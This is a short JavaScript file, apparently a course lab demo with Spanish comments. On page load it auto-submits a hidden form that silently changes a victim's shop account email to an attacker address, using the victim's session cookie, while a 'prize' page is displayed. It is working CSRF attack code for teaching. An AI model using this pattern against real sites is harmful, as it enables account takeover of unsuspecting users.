// Ataque CSRF (M5): al cargar la pagina, se envia solo el formulario oculto que
// cambia el correo de la cuenta de la victima en la tienda. La victima solo ve
// una pagina de "premio"; el POST viaja en segundo plano con su cookie de sesion.

document.addEventListener("DOMContentLoaded", () => {
    const estado = document.getElementById("estado");
    estado.textContent =
        "(En segundo plano se envió un POST a /api/account/email para cambiar " +
        "tu correo a atacante@evil.test.)";
    document.getElementById("csrf-form").submit();
});
